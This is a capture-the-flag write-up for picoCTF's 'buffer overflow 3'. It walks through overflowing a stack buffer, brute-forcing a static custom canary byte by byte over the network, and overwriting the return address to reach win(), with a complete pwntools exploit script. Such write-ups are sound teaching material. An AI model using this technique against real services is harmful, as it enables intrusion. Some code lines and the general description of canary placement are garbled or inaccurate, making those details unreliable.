# PicoCTF - buffer overflow 3

## Challenge Overview
**Title:** buffer overflow 3  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** vuln.c, vuln

## Description
Do you think you can bypass the protection and get the flag? It looks like Dr. Oswal added a stack canary to this program to protect against buffer overflows. You can view source here. And connect with it using: nc saturn.picoctf.net 62869

## Source Code
```c
f#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    fflush(stdout);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

## Analysis
This challenge is, similarly to the previous ones, a **buffer overflow** targeting the return address to call `win()`.  
However, now we a have stack **canary** to bypass.

### Stack Canary
A stack canary is a **randomized value** generated at process **startup** and in x86 are usually stored in the `fs/gs` legacy registers.  
When a **stack frame** is created, this value is stored after the return address.  
At the end of the function, before the return, the value stored on the stack is **compared** to the original one stored in the register to see if it was changed from a **linear overflow** from the local variables.

#### Stack Layout Example
**High address** | vulnerable buffer | other values | old ebp | canary | return address | **Low address**

To **change** the return address from the vulnerable buffer, we would also **override** the canary.  
Now we need to **find** the canary in order to achieve the override.  
But the **randomized** nature of the canary at each run makes it even **harder**.

Back to the program, we can see a custom implementation of a stack canary which is **flawed**.
```c
char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
...
void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
```
A **static** canary of size **4** is read from the file `canary.txt`.  
This then is copied to the local buffer `canary` in `vuln` which precedes the vulnerable buffer `buf`.  
Having **static** canaries is **bad** since we can brute force it across multiple runs with it remaining the same.

The analysis will be broken in two parts:
1) Payload Generation
2) Canary Discovery
3) Final

## Payload Generation
This part is very similar to the previous challenges.

The program first reads an arbitrary size to read from the user.
```c
printf("How Many Bytes will You Write Into the Buffer?\n> ");
while (x<BUFSIZE) {
  read(0,length+x,1);
  if (length[x]=='\n') break;
  x++;
}
sscanf(length,"%d",&count);

printf("Input> ");
read(0,buf,count);
```
This essentially reads the size one digit at a time with a limit of 64 digits.  
It then converts it to an integer with `sscanf`.

First, we create a `flag.txt` with value `my flag` and `canary.txt` with value `pico`.  
`pico` is **70 69 63 6F** in hex, we will find this value in the **stack**  
I will now open `gdb` to examine the stack and find what I need.  
I set a breakpoint after the read into the buffer and observe the stack
```
(gdb) b *0x08049549
Breakpoint 2 at 0x8049549
(gdb) r
The program being debugged has been started already.
Starting program: /home/giorgos/Downloads/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 8
Input> AAAAAAAA

Breakpoint 2, 0x08049549 in vuln ()
(gdb) x/64x $ebp-100
0xffffcbd4:	0x00000000	0x00000004	0x0804c000	0x08049640
0xffffcbe4:	0x0804c000	0x41414141	0x41414141	0xffffcc38
0xffffcbf4:	0xf7fdabb0	0x00000000	0x0804c000	0x08049640
0xffffcc04:	0xf7ffcb60	0xffffcc38	0x08049480	0x0804d1a0
0xffffcc14:	0x00000001	0x00000004	0x0804d1a0	0x000003e8
0xffffcc24:	0x0804c000	0x6f636970	0x00000001	0x000003e8
0xffffcc34:	0x0804c000	0xffffcc58	0x08049622
```
**buf:** 0xffffcbe8
**Canary Location:** buf + 64
**Return Address Location:** canary + 16
**Target Address:** 0x08049336

**Payload:** A*64 + canary + A*16 + target_address

To do this, along with the second and final part of the challenge, I will use the following **Python** script
### Python Script
```python
from pwn import *
import sys

def reverse_str(str):
    chunks = [str[i:i+2] for i in range(0, len(str), 2)]

    chunks.reverse()

    hex_bytes = ['\\x' + chunk for chunk in chunks]
    return ''.join(hex_bytes)


def construct_payload(canary, canary_dist, addr="", ret_dist=0, encode=False):
    payload = 'A'*canary_dist
    payload += reverse_str(canary)
    payload += 'A'*ret_dist
    if addr !="":
        payload += reverse_str(addr)
    if encode:
        return payload.encode().decode('unicode_escape').encode('latin1')
    return payload


def send_to_server(payload):
    # Connect to the remote server
    host = 'saturn.picoctf.net'
    port = 62869
    conn = remote(host, port)

    conn.recvline()
    conn.recv()

    conn.sendline(str(len(payload)).encode())

    conn.recv()

    conn.sendline(payload)

    # Receive the server's response
    response = conn.recvall()
    # Close the connection
    conn.close()

    return response


def get_flag(output):
    index = output.find("picoCTF{")
    result = output[index:]  # substring from pattern to end
    return result


def execute():
    win_addr = "08049336"
    canary_dist = 64
    ret_dist = 16
    canary = "____REDACTED____".encode()[::-1].hex()
    payload = construct_payload(canary, canary_dist, win_addr, ret_dist, True)
    server_output = send_to_server(payload)
    print(get_flag(server_output.decode('utf-8', errors='ignore')))


def find_canary():
    canary_dist = 64
    confirmed = ""
    for chr in "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz":
        canary = confirmed+chr
        payload = construct_payload(canary.encode()[::-1].hex(), canary_dist, encode=True)
        server_output = send_to_server(payload)
        print(canary + ": ", end="")
        print(server_output)


def generate_payload():
    win_addr = "08049336"
    canary = "cana".encode()[::-1].hex()
    canary_dist = 64
    ret_dist = 16
    payload = construct_payload(canary, canary_dist, win_addr, ret_dist)
    print(len(payload))
    print(payload)

def main():
    if(len(sys.argv) <=1):
        print("Please enter operation")
        sys.exit()
    operation=sys.argv[1]
    
    if operation == "payload":
        generate_payload()
    elif operation == "find":
        find_canary()
    elif operation == "execute":
        execute()
    else:
        print("Invalid operation")
main()
```
The script has three operations:
1) payload - Generate payload
2) find - Find canary value
2) execute - Get flag

`payload` will generate the payload for our **local** canary value.  
To use it we will run
```
$ printf "$(python script.py payload )" | ./vuln
How Many Bytes will You Write Into the Buffer?
> Input> Ok... Now Where's the Flag?
my flag

[2]    34132 done                              printf "$(python script.py payload )" | 
       34134 segmentation fault (core dumped)  ./vuln
```
And we get our local flag.

## Canary Discovery
Now for finding the canary of the server.  
The canary is a **4** character value and static.  
We can **brute force** it assuming the english alphabet with both upper and lowercase.  
But this creates 52<sup>4</sup> options which is a lot.

Instead we will brute force letter by letter.  
To decide if we found a letterm we will examine the output
When the canary is **incorrect** we get the message:
```
***** Stack Smashing Detected ***** : Canary Value Corrupt!
```
And when it is **correct** we will get
```
Ok... Now Where's the Flag?
```

So we can overflow the buffer **up to** the **first letter** of the canary and try every option until we see the second message

This can be done using the `find` option of the **script** but with some **manual** work as well
```python
canary_dist = 64
confirmed = ""
for chr in "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz":
    canary = confirmed+chr
    payload = construct_payload(canary.encode()[::-1].hex(), canary_dist, encode=True)
    server_output = send_to_server(payload)
    print(canary + ": ", end="")
    print(server_output)
```
`confirmed` contains the canary letters we have **discovered**.  
Initially it is **empty**, every time we find a letter, we **add** it to `confirmed` and it will find the next one  
To use it we run
```
$ python script.py find | grep -i "flag"
B: b"Ok... Now Where's the Flag?\n"
```
The first letter of the output is the canary part we are testing  
So `B` is the first letter of the canary, we add it to `confirmed` and repeat.  
We repeat until we get all **4** letters.

**Hint:**  
For the **Family Guy** fans,  
`_____REDACTED_____ is the word`

## Final Part
Now that we know how to construct our payload and found the canary, we can **complete** the challenge.  
The final option of the **script**, `execute`, generates the payload, sends it to the server and prints the flag.  
All we have to do is change `canary` in `execute()` with the canary value we found from above
```python
def execute():
    win_addr = "08049336"
    canary_dist =
    ret_dist = 16
    canary = "B____REDACTED____".encode()[::-1].hex() 64 # CHANGE STRING
```
```
$ python script.py execute              
[+] Opening connection to saturn.picoctf.net on port 57525: Done
[+] Receiving all data: Done (70B)
[*] Closed connection to saturn.picoctf.net port 57525
picoCTF{____REDACTED____}
```

## Solution
- Find distance of `buf` in `vuln()` from the canary and return address
- Override return address with the address of `win()` preserving the canary value
- Find the canary value of the server by brute forcing one by one letter